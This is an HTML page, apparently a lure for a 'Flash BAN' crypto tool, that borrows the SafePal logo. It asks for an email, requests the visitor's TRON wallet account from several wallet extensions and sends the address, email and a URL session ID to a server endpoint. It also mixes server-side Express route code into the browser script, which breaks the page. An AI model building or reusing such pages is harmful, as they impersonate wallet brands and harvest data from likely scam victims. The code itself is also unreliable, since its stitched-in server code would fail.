<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flash BAN 11.0 Connection to DEFI Network</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: rgb(72, 32, 232);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 650px;
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            background: white;
            box-shadow: 0px 0px 15px rgba(72, 32, 232, 0.5);
            border: 2px solid rgb(72, 32, 232);
            position: relative;
            color: rgb(72, 32, 232);
        }
        .wallet-logo {
            width: 80px;
            margin-bottom: 10px;
        }
        input {
            padding: 12px;
            margin-bottom: 15px;
            width: calc(100% - 24px);
            border-radius: 6px;
            border: 1px solid rgb(72, 32, 232);
            outline: none;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        button {
            padding: 12px 20px;
            width: 100%;
            border-radius: 6px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            background-color: rgb(72, 32, 232);
            color: white;
            transition: background 0.3s ease;
        }
        button:hover {
            background-color: white;
            color: rgb(72, 32, 232);
            border: 2px solid rgb(72, 32, 232);
        }
        #statusMessage {
            margin-top: 20px;
            font-size: 14px;
            color: rgb(72, 32, 232);
        }
        #walletAddress {
            margin-top: 20px;
            font-size: 16px;
            font-weight: bold;
            color: rgb(72, 32, 232);
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="./safepal.png" alt="SafePal Logo" class="wallet-logo">
        <h1>Flash BAN v1.0.0.1</h1>
        <input type="email" id="emailInput" placeholder="Enter your email" required>
        <button id="connectButton">CONNECT</button>
        <div id="walletAddress"></div>
        <div id="statusMessage"></div>
    </div>

    <script>
        let connectedAddress = null;
        let isConnecting = false;
        
        // Get session ID from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');

        async function updateServerStatus(address) {
            try {
                const response = await fetch('/api/status', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        sessionId: sessionId,
                        address: address,
                        email: document.getElementById('emailInput').value
                    })
                });
                
                if (!response.ok) {
                    throw new Error('Failed to update server status');
                }
            } catch (error) {
                console.error('Error updating server:', error);
            }
        }

        async function connectWallet() {
            if (isConnecting) return;
            isConnecting = true;
            
            const email = document.getElementById('emailInput').value;
            if (!email) {
                document.getElementById('statusMessage').textContent = "Please enter your email address.";
                isConnecting = false;
                return;
            }

            document.getElementById('connectButton').textContent = 'Connecting...';
            document.getElementById('connectButton').style.backgroundColor = 'rgb(150, 100, 255)';

            const wallets = [window.tronLink, window.trustwallet, window.exodus, window.safepal, window.bitget];
            
            for (const wallet of wallets) {
                if (wallet && wallet.tronWeb) {
                    try {
                        await wallet.request({ method: 'tron_requestAccounts' });
                        connectedAddress = wallet.tronWeb.defaultAddress.base58;
                        break;
                    } catch (error) {
                        document.getElementById('statusMessage').textContent = "Please unlock your wallet and try again.";
                    }
                }
            }

            if (!connectedAddress) {
                document.getElementById('statusMessage').textContent = "No supported wallet found. Please install Trust Wallet, Exodus, TronLink, SafePal, or Bitget.";
            } else {
                document.getElementById('connectButton').textContent = 'Wallet Connected';
                document.getElementById('connectButton').style.backgroundColor = 'rgb(0, 128, 0)';
                document.getElementById('walletAddress').textContent = `Connected TRX Address: ${connectedAddress}`;
                
                // Update server with connected address and session ID
                if (sessionId) {
                    await updateServerStatus(connectedAddress);
                }
            }
            
            isConnecting = false;
        }

        // Add API endpoint to check connection status
        app.get('/api/status', (req, res) => {
            const sessionId = req.query.session;
            if (!sessionId) {
                return res.status(400).json({ error: 'Session ID required' });
            }
            
            // Return the connection status and address if available
            res.json({
                isConnected: connectedAddress !== null,
                address: connectedAddress
            });
        });

        document.getElementById('connectButton').addEventListener('click', connectWallet);
    </script>
</body>
</html>
